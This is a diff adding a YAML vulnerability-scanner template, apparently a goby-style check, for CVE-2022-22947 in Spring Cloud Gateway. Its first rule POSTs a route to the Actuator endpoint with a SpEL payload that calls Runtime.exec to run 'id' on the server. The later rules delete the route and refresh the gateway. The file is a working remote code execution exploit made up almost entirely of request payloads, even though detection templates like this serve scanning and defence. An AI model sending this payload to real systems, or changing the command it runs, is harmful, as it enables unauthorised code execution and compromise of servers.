@@ -1,0 +1,50 @@
+name: Spring_Cloud_Gateway_Actuator_API_SpEL_Code_Injection_CVE_2022_22947
+transport: http
+set: {}
+detail:
+  dock: app="springboot" || app="spring-framework" || app="spring-gw"
+  product: Spring Cloud Gateway
+  homepage: https://spring.io/projects/spring-cloud-gateway
+  impact: In spring cloud gateway versions prior to 3.1.1+ and 3.0.7+ , applications
+    are vulnerable to a code injection attack when the Gateway Actuator endpoint is
+    enabled, exposed and unsecured. A remote attacker could make a maliciously crafted
+    request that could allow arbitrary remote execution on the remote host.
+  description: 'Spring Cloud Gateway aims to provide a simple, yet effective way to
+    route to APIs and provide cross cutting concerns to them such as: security, monitoring/metrics,
+    and resiliency.'
+rules:
+  r1:
+    method: POST
+    path: /actuator/gateway/routes/gobytest
+    follow_redirects: true
+    headers:
+      Accept-Encoding: gzip, deflate
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,
+        like Gecko) Chrome/97.0.4692.71 Safari/537.36
+      Content-Type: application/json
+    body: "{\r\n  \"id\": \"gobytest\",\r\n  \"filters\": [{\r\n    \"name\": \"AddResponseHeader\"\
+      ,\r\n    \"args\": {\r\n      \"name\": \"Result\",\r\n      \"value\": \"#{new\
+      \ String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new\
+      \ String[]{\\\"id\\\"}).getInputStream()))}\"\r\n    }\r\n  }],\r\n  \"uri\"\
+      : \"http://example.com\"\r\n}"
+    expression: response.status == 201 && response.raw_header.bcontains(b'gobytest')
+  r2:
+    method: DELETE
+    path: /actuator/gateway/routes/gobytest
+    follow_redirects: true
+    headers:
+      Accept-Encoding: gzip, deflate
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,
+        like Gecko) Chrome/97.0.4692.71 Safari/537.36
+    expression: response.status == 200
+  r3:
+    method: POST
+    path: /actuator/gateway/refresh
+    follow_redirects: true
+    headers:
+      Accept-Encoding: gzip, deflate
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,
+        like Gecko) Chrome/97.0.4692.71 Safari/537.36
+      Content-Type: application/x-www-form-urlencoded
+    expression: response.status == 200
+expression: r1() && r2() && r3()
